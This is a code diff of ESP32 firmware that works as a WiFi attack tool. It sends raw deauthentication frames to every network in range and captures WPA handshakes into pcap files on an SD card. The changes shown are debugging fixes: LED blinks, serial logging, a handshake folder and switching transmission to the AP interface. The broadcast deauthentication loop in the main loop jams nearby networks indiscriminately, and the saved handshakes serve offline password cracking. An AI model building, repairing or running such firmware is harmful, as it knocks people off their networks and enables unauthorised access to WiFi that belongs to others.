@@ -34,10 +34,13 @@ void sendDeauth(uint8_t* bssid, uint8_t* client) {
         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
         0x00, 0x00, 0x01, 0x00
     };
+    Serial.println("TX");
+    digitalWrite(LED_PIN, LOW);
     for (int i = 0; i < 10; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false);
+        esp_wifi_80211_tx(WIFI_IF_AP, deauthPkt, sizeof(deauthPkt), false);
         delay(2);
     }
+    digitalWrite(LED_PIN, HIGH);
 }
 
 bool isEAPOL(uint8_t* payload) {
@@ -70,7 +73,7 @@ void initPcapHeader() {
 
 void captureHandshake(uint8_t* payload, uint16_t len, uint8_t msgNum, uint8_t* bssid) {
     char pcapName[32];
-    sprintf(pcapName, "/handshake_%02X%02X%02X%02X%02X%02X.pcap",
+    sprintf(pcapName, "/handshake/%02X%02X%02X%02X%02X%02X.pcap",
             bssid[0], bssid[1], bssid[2],
             bssid[3], bssid[4], bssid[5]);
 
@@ -114,7 +117,7 @@ void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
             Serial.printf("[TARGET] %s | %s | CH: %d\n", ssid, macStr, targetChannel);
 
             char pcapName[32];
-            sprintf(pcapName, "/handshake_%02X%02X%02X%02X%02X%02X.pcap",
+            sprintf(pcapName, "/handshake/%02X%02X%02X%02X%02X%02X.pcap",
                     targetBSSID[0], targetBSSID[1], targetBSSID[2],
                     targetBSSID[3], targetBSSID[4], targetBSSID[5]);
             pcapFile = SD_MMC.open(pcapName, FILE_WRITE);
@@ -172,8 +175,7 @@ void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
                     captureHandshake(payload, len, msgNum, bssid);
                     digitalWrite(LED_PIN, HIGH);
 
-                    Serial.printf("[HANDSHAKE] %s
-", key);
+                    Serial.printf("[HANDSHAKE] %s\n", key);
                 }
             }
         }
@@ -199,6 +201,13 @@ void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
 void setup() {
     WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
     pinMode(LED_PIN, OUTPUT);
+    // Blink LED to show code is running
+    for(int i=0; i<5; i++) {
+        digitalWrite(LED_PIN, LOW);
+        delay(100);
+        digitalWrite(LED_PIN, HIGH);
+        delay(100);
+    }
     digitalWrite(LED_PIN, HIGH);
     Serial.begin(115200);
     delay(100);
@@ -213,6 +222,7 @@ void setup() {
         Serial.println("SD: FAILED (continuing without)");
     } else {
         Serial.println("SD: OK");
+        SD_MMC.mkdir("/handshake");
         initPcapHeader();
     }
     Serial.flush();
@@ -257,11 +267,13 @@ void loop() {
         if (stageStartTime == 0) {
             stageStartTime = now;
             Serial.println("[STAGE 1] Deauthing all networks...");
+        Serial.flush();
         }
         
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
         
         if (now - lastDeauthTime > 100) {
+            Serial.println("[DEAUTH] Sending...");
             uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
             sendDeauth(broadcast, broadcast);
             lastDeauthTime = now;
